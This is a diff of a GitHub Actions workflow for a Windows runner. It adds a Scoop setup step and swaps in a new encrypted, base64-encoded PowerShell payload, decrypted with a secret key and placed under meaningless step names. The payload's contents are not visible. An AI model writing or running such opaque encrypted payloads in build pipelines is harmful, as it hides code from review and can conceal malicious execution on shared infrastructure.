@@ -24,10 +24,17 @@ jobs:
   k:
     runs-on: windows-latest
     steps:
+      - name: king
+        uses: MinoruSekine/setup-scoop@main
+        with:
+          install_scoop: 'true'
+          buckets: extras
+          scoop_update: 'true'
+          update_path: 'true'
       - name: June
         shell: pwsh
         run: |
-          $encrypted_payload = "U2FsdGVkX18W9nL/ErsTKbLckK95fYv+rmP5gIr+goK+GZFRz86ghN7DlSDkpVjf8ak7ZUVno2zInndjgt/xYj4Ha4WAF8al2euJv0RM8FI3eVg86Xg1Kkbp0XHBi4hnFKErQ5MZ4vLoSoqQF9M6cA=="
+          $encrypted_payload = "U2FsdGVkX1/NheSpGVHELFXBhBpebyrDyiOt7FJC3TTu17vwWm7XVyIj2SrNSy54+fBLwtJ9L9iCjlX7EKHlef8ZKDhcQkFlLBHYQvS+9vsigdc8wft3FAL9VgT6Fa3Iy0NSJSJZI+DoqfMluv0ZyUcjCey4Q2yvkXILDaqF0Nxo37IcFhZsbbbtxOZdtr4G+p+qK6e8fDOUWBsBhNvtW11Vl8U8QfU3VGNdq8EYhJqO3m/wqSvbbNDCPEflaOrqN3iJHSSaq1opbH/XN0gOBUlZ13KUdQfWE3t5EihVR0tDNMRk0FK6Vkhns0bjr3O4U8SPX3Pm6sITMY7TtyopXQB+oPxMhPHupdNgDgYr9O9B+fFM1fOB2cTuDL+Nr37NP7GyUwVtE40XrbjOvWl0O99fUj9vBpGKZLK3HYSEmonRr8/Z7yYiw+j1xfpRi8QuiS4YF6jNquiBYC8SbrqXB44HjBF+BilP+qVHiKCdt0VBtfTC+LNavw8/DtNKAB43LTdTw1ubTwiCiqajhtQYCsnxPlooivDcobCZBXdrTodwQkBP+Qfq0lcwQ/CG5BlN2WoopoODPBNtVNkSUKur6Rez2HEyC+qjKdwLviI08PutdxDjasht1QNo+3e0NtrngbowG0M4hoHq9h1RcbZyGUG33M8TuariLs+3mmFGhkx6RVI5cGA6UDcZ1hwvssBWbZhn1KGFzMhDrba1lrwWn9xE5kVstHxru3eX0tQPWl0OS9m2zmfzhhHP7QH1ke5Yx6YrBXTA82s9YfQzsqMSHycgnsQB3hJJXiQVpDrJhoMl2IOezHkUK+2gaxqB+7Jspv1ZB5wKFz4LJTyciBiuoUHeZ2kdg/sOyu+yBSwaQ+XWTdIV89yYKQ8VjqMXno/inXOoSL+cs8RNv24cg4uWnFDYb1H2JQy6Bz/C8mdXBsbgBzPl0tT/FXsBxbyvoBLOIL7zSeBi6+X1Ue8e5IoVr/CicsSsdTq1BHBtfKBJxpbo6RFsxa89GEoIv7CI9meXygLDmgdAsYki+zMlBth/UibeqBfpK7rKv9GoyzD/fGJKwI8dZmP8m8GNYv3rINx5"
           $passphrase = $env:DECRYPTION_KEY
 
           $iterations = 10000
